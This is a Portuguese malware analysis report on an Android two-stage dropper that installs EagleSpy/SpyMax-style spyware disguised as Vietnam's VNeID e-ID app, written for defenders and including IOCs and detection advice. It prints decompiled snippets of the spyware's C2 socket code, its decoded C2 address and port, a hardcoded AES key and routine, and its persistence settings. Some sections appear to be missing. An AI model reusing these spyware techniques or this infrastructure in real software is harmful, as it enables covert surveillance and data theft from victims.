Spyware Android Disfarçado de Aplicativo Governamental Vietnamita (VNeID) — Família EagleSpy/SpyMax

TLP:CLEAR Autor: Rives Data: [DATA DE PUBLICAÇÃO] Artefato: Aplicação Android (.apk) — dropper de dois estágios

1. Sumário Executivo

Esta análise documenta um artefato Android malicioso de arquitetura dropper em dois estágios, cujo estágio final se disfarça visualmente do aplicativo VNeID — a aplicação oficial de identidade eletrônica (e-ID) do governo do Vietnã — com o objetivo de induzir a vítima a conceder um conjunto extenso de permissões sensíveis do sistema operacional Android.

O payload final foi identificado como pertencente à linhagem EagleSpy, uma variante derivada do código-fonte vazado da família SpyNote/SpyMax, RATs comerciais para Android amplamente reaproveitadas por múltiplos atores de ameaça devido à disponibilidade pública de seu builder.

O artefato demonstra sofisticação desigual: forte ofuscação de identificadores de código combinada com práticas criptográficas fracas na camada de rede (Base64 sem cifra real para configuração de C2, AES em modo ECB sem IV) — um padrão consistente com reaproveitamento de builder comercial sem hardening adicional por parte do operador.

Notas de atribuição

Esta análise não estabelece atribuição a um grupo específico. A string "EagleSpy" embutida como chave de protocolo/identificador de conexão é um indicador forte de linhagem de ferramenta (builder), não necessariamente de autoria — builders dessa família circulam publicamente e são reutilizados por atores não relacionados entre si. Recomenda-se tratar essa amostra como atividade genérica de e-crime/spyware comercial até que IOCs de infraestrutura sejam correlacionados com clusters de campanha conhecidos (VirusTotal, MalwareBazaar, Koodous).

Vetor de distribuição presumido

Não confirmado diretamente na análise estática, mas a arquitetura (dropper + engenharia social visual de app governamental) é consistente com distribuição via sideloading fora da Google Play Store. A presença de uma verificação de intent para messenger.com e o package com.orca (KakaoTalk) nas queries do manifest sugere possível interesse do malware em interoperar ou detectar apps de mensageria instalados na vítima — hipótese que requer validação por análise dinâmica adicional.

3. Metodologia de Análise

A análise foi conduzida via engenharia reversa estática, utilizando o JADX (GUI) para descompilação de bytecode DEX para pseudocódigo Java, complementado por CyberChef para deobfuscação manual de strings codificadas em Base64.

  1. Reconhecimento estrutural (AndroidManifest.xml, BuildConfig, árvore de packages)
  2. Identificação de arquitetura multi-estágio via análise do fluxo de decisão da Activity inicial (splash)
  3. Extração do payload de segundo estágio embutido em assets/
  4. Análise isolada do payload como projeto JADX separado
  5. Mapeamento de permissões declaradas → capacidades de coleta de dados
  6. Localização e deobfuscação manual da lógica de C2 e criptografia

Não foi realizada análise dinâmica (execução em sandbox/emulador) nesta fase — os achados refletem exclusivamente comportamento inferido por análise estática, e permanecem como itens de validação recomendados na Seção 7.

4. Análise Técnica

4.1 Estágio 1 — Dropper (com.appd.instll.load)

O BuildConfig do artefato revela metadados incomuns para uma aplicação legítima:

APPLICATION_ID = "com.appd.instll.load"
BUILD_TYPE     = "release"
FLAVOR         = "payload"
VERSION_CODE   = 331165
VERSION_NAME   = "3.31.165"

A build flavor nomeada literalmente "payload", combinada com a estrutura de package instll.load (contração de installer + loader), constitui um indicador textual forte de que este artefato é um componente de estágio intermediário em uma cadeia de infecção, não a ameaça final.

Lógica de decisão (classe splash, ponto de entrada da aplicação):

private static String TargetBaseid = "com.found.hentai";

public static boolean isAppAvailable(Context context, String str) {
    try {
        context.getPackageManager().getApplicationInfo(str, 0);
        return true;
    } catch (PackageManager.NameNotFoundException unused) {
        return false;
    }
}

A verificação de presença do pacote-alvo utiliza o padrão idiomático do Android SDK — PackageManager.getApplicationInfo() capturado via try/catch, já que a API não expõe um método booleano direto de checagem de instalação.

O comportamento subsequente se ramifica em dois fluxos, ambos com atraso de 1 segundo via Timer/TimerTask:

  • Se com.found.hentai já está instalado: o dropper invoca getLaunchIntentForPackage() e abre o app existente diretamente, finalizando-se em seguida — comportamento que minimiza a percepção de anomalia pelo usuário.
  • Se não está instalado: o dropper invoca uma Activity interna (identificador ofuscado oxgouacygcwohqzcuxomeqcxomnxun3), responsável por extrair e/ou disparar a instalação do payload embutido em assets/childapp.apk.

Essa mesma Activity interna também contém lógica de checagem de idioma padrão do sistema via Locale.getDefault().getLanguage(), sugerindo uma possível camada de targeting geográfico/linguístico antes da ativação do payload. A lista completa de idiomas-alvo não foi totalmente extraída (ver Seção 7).

4.2 Estágio 2 — Payload (com.found.hentai, disfarçado de VNeID)

O payload extraído de assets/childapp.apk corresponde ao package com.found.hentai — confirmando o alvo de verificação do dropper — e é o componente com capacidade real de spyware.

Camuflagem visual:

A cobertura ampla de actions (incluindo variantes específicas de HTC e MIUI/Xiaomi) demonstra esforço deliberado para garantir persistência entre reinicializações através de diferentes fabricantes/customizações de Android.

Abuso de Device Administrator API (AdminReceiver): o payload registra um componente que estende DeviceAdminReceiver, protegido pela permissão de sistema BIND_DEVICE_ADMIN. Uma vez concedida pelo usuário (via prompt de sistema, tipicamente induzido por engenharia social), essa API dificulta a desinstalação direta do app.

Componente de ocultação adicional — uma segunda Activity com:

android:persistent="true"
android:excludeFromRecents="true"
android:exported="true"
android:alwaysRetainTaskState="true"

excludeFromRecents remove o componente da lista de apps recentes; persistent="true" busca manter o processo permanentemente ativo — reforçando a estratégia de persistência multi-camada observada.

4.3 Comando e Controle (C2)

A comunicação com o servidor de C2 é implementada via socket TCP raw (não HTTP/HTTPS), na classe SecondarySocket:

Socket socket3 = new Socket(
    InetAddress.getByName(
        utilities.eosjvohlvdszzfnoawempbvgtfrhiukwdrdirywuhpeetixbkj45(initializeService.ClientHost)
    ),
    Integer.parseInt(
        utilities.eosjvohlvdszzfnoawempbvgtfrhiukwdrdirywuhpeetixbkj45(initializeService.ClientPort)
    )
);

Os valores de host e porta são armazenados como strings codificadas em Base64 na classe initializeService, decodificados em runtime por uma função utilitária de nome ofuscado, confirmada como um decoder Base64 simples, sem camada adicional de cifra:

ClientHost (Base64): MTAzLjI1My4yMy44   →  Decoded: 103.253.23.8
ClientPort (Base64): Nzc3Mw==            →  Decoded: 7773

IOC de rede confirmado: 103.253.23.8:7773

A mesma função de decodificação revela uma "chave de conexão" hardcoded:

Base64: RWFnbGVTcHk=  →  Decoded: "EagleSpy"

Essa string confirma a linhagem/identificação do builder utilizado pelo operador.

4.4 Criptografia de Payload de Dados

A classe EncryptionCUtils implementa criptografia simétrica AES para os dados trocados com o C2:

private static final String AES_ALGORITHM = "AES";
private static final String SECRET_KEY = "93b89a273c1fbe59073af7bd9adfa6c0";

public static String encrypt(String str) throws Exception {
    SecretKeySpec secretKeySpec = new SecretKeySpec(SECRET_KEY.getBytes(), AES_ALGORITHM);
    Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
    cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);
    return Base64.encodeToString(cipher.doFinal(str.getBytes()), Base64.DEFAULT);
}

Observações críticas de fragilidade criptográfica:

  • A chamada Cipher.getInstance("AES"), sem especificação explícita de modo/padding, resolve por padrão para AES/ECB/PKCS5Padding no provider padrão do Android/JCE. O modo ECB não utiliza vetor de inicialização (IV), fazendo com que blocos de texto plano idênticos produzam blocos de texto cifrado idênticos.
  • A chave, com 32 caracteres hexadecimais usados diretamente como bytes ASCII (não convertidos de hex para 16 bytes), resulta em uma chave efetiva de 32 bytes — caracterizando AES-256.
  • A chave é estática e hardcoded no APK, sem qualquer derivação dinâmica (KDF) ou proteção adicional. Isso permite a qualquer analista com acesso ao APK decifrar retroativamente qualquer tráfego de C2 capturado, caso a chave permaneça constante entre amostras da mesma campanha.

7. Limitações e Itens Pendentes de Validação

  1. Lista completa de idiomas-alvo: a chamada Locale.getDefault().getLanguage() foi localizada, mas a lista/contagem exata de idiomas comparados na lógica condicional não foi extraída até o fechamento deste relatório.
  2. Hashes SHA256: ambos os campos precisam ser preenchidos com o valor real calculado (sha256sum) antes da publicação.
  3. Confirmação de execução real do payload: a análise foi inteiramente estática. Recomenda-se análise da classe oxgouacygcwohqzcuxomeqcxomnxun3 para confirmação direta do fluxo de instalação.
  4. Atribuição: nenhuma atribuição a grupo/campanha específica é feita neste relatório; a string "EagleSpy" indica linhagem de ferramenta, não autoria confirmada.
  5. Vetor de distribuição: presumido como sideloading/engenharia social, mas não confirmado por telemetria externa.

8. Recomendações de Detecção e Mitigação

  • Usuários finais: desconfiar de aplicativos governamentais distribuídos fora de canais oficiais; revisar periodicamente "Administradores do dispositivo" em Configurações de Segurança.
  • Blue team: monitorar conexões de saída em portas não-padrão (ex: 7773); alertar sobre apps com REQUEST_INSTALL_PACKAGES combinado a excludeFromRecents e persistent=true.
  • Threat hunting: buscar outras amostras reutilizando a mesma chave AES hardcoded (93b89a273c1fbe59073af7bd9adfa6c0) — reaproveitamento de chave entre variantes é comum em builders comerciais e pode revelar amostras irmãs da mesma campanha.

9. Conclusão

O artefato analisado representa um exemplo bem documentado de spyware Android comercial (linhagem EagleSpy/SpyMax) empregando arquitetura de dropper em dois estágios e engenharia social por imitação de identidade visual de aplicativo governamental legítimo (VNeID). A amostra combina táticas de persistência robustas (Device Admin + Broadcast Receivers multi-OEM) com uma camada de proteção de configuração de C2 tecnicamente fraca (Base64 sem cifra, AES em modo ECB com chave estática), permitindo decodificação completa da infraestrutura de C2 e do mecanismo de criptografia por meio de engenharia reversa estática padrão, sem necessidade de quebra de criptografia ou análise dinâmica.

Referências consultadas para validação de técnicas MITRE ATT&CK for Mobile: attack.mitre.org/matrices/mobile (acesso em julho de 2026).
